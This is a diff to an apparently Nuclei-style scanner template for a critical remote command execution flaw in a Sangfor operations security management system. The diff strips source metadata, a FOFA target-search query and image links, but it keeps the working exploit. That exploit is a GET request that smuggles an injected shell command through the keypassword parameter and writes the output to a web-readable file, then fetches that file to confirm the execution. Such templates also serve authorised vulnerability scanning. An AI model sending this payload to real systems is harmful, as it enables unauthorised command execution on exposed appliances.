@@ -3,12 +3,8 @@ info:
   name: 深信服运维安全管理系统 protocol_session存在远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lhi0g9gyiihbxg3s'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: lhi0g9gyiihbxg3s
-    fofa: body="/fort/login" && header="FORTSESSIONID"
 http:
 - raw:
   - 'GET /isomp-protocol/protocol/session?keyPath=/etc/passwd&protocol=ssh&keypassword=123456%27%3Bid+%3E%20/usr/local/tomcat/webapps/fort/trust/version/T1.txt;&sshd=1 HTTP/1.1
@@ -23,7 +19,7 @@ http:
 
     Connection: keep-alive
 
-    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1763286068526-489406bd-b836-47e4-bfb3-8b508fc41446.png)
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
 
     验证路径'
   redirects: false
@@ -34,9 +30,7 @@ http:
 - raw:
   - 'GET /fort/trust/version/T1.txt HTTP/1.1
 
-    Host: {{Hostname}}
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1763286068906-31833833-1eea-4ab0-a0b3-5613d1a6d6c3.png)'
+    Host: {{Hostname}}'
   redirects: false
   matchers:
   - status:
